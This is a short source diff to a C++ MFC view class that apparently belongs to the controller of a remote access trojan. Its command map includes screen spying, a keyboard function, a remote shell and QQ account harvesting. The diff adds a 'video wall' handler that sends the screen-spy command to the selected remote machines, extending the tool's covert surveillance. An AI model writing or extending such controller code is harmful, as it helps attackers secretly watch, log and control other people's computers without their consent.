@@ -74,6 +74,7 @@ BEGIN_MESSAGE_MAP(CPcView, CView)
 	ON_WM_CONTEXTMENU()
 	ON_COMMAND(IDM_FILEMANAGER, OnFilemanager)
 	ON_COMMAND(IDM_SCREENSPY, OnScreenspy)
+	ON_COMMAND(IDM_VIDEOWALL, OnVideowall)
 	ON_COMMAND(IDM_KEYBOARD, OnKeyboard)
 	ON_COMMAND(IDM_SHELL, OnShell)
 	ON_COMMAND(IDM_QQINFO, OnQqinfo)
@@ -131,6 +132,7 @@ BEGIN_MESSAGE_MAP(CPcView, CView)
 	//}}AFX_MSG_MAP
 	
 //	ON_WM_RBUTTONDOWN()
+
 END_MESSAGE_MAP()
 
 /////////////////////////////////////////////////////////////////////////////
@@ -291,6 +293,14 @@ void CPcView::OnScreenspy()
 	//BYTE	bToken = COMMAND_SCREEN_SPY;
 	m_List.SendSelectCommand(lpScreenPacket , nScreenPacketLength);
 }
+
+void CPcView::OnVideowall()
+{
+	// TODO: 在此添加命令处理程序代码
+	m_List.SendSelectCommand(lpScreenPacket,nScreenPacketLength);
+
+}
+
 void CPcView::OnKeyboard() 
 {
 	// TODO: Add your command handler code here
@@ -1030,3 +1040,6 @@ void CPcView::OnDisconnect()
 //	//CXTPCommandBars::TrackPopupMenu(pM, TPM_RIGHTBUTTON,
 //	//	p.x, p.y, AfxGetMainWnd(), 0, 0, ((CXTPFrameWnd*)AfxGetMainWnd())->GetCommandBars());
 //}
+
+
+
